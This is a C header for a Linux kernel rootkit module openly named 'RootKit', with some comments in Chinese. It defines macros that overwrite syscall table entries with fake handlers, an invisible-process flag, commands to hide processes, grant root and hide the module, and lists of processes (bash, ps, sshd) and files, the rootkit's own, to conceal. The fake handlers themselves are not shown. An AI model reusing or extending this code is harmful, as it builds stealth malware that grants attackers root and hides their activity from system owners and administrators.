# ifndef _GU_ZHENGXIONG_STRUCTS_H
# define _GU_ZHENGXIONG_STRUCTS_H

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define PF_INVISIBLE 0x10000000

#define MODULE_NAME "RootKit"
#define fn_printk(level, fmt, ...) 				\
	printk(level "%s: " fmt, __func__, ##__VA_ARGS__)

#define fm_printk(level, fmt, ...) 				\
	printk(level "%s.%s: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)

#define fn_alert(fmt, ...) 						\
	fn_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

#define fm_alert(fmt, ...) 						\
	fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)

// do...while的循环体只会执行一次
// 是为了让HOOK_SCT是一条语句
#define HOOK_SCT(sct, name)  					\
	do { 										\
		real_##name = (void *)sct[__NR_##name]; \
		sct[__NR_##name] = (void *)fake_##name; \
	}while(0)


#define UNHOOK_SCT(sct, name) 					\
	sct[__NR_##name] = (void *)real_##name

enum {
	HIDEPROC = 0,
	ROOT = 1,
	HIDEMOD = 2,
};

// List of processes to hide from ps
const char * const HIDDEN_PROCESSES[] = {"bash", "ps", "sshd"};

// List of files to hide from getdents and open
const char * const HIDDEN_FILES[] = {"RootKit.h", "RootKit.c", "RootKit.ko","Makefile","RootKit"};
# endif // RootKit.h
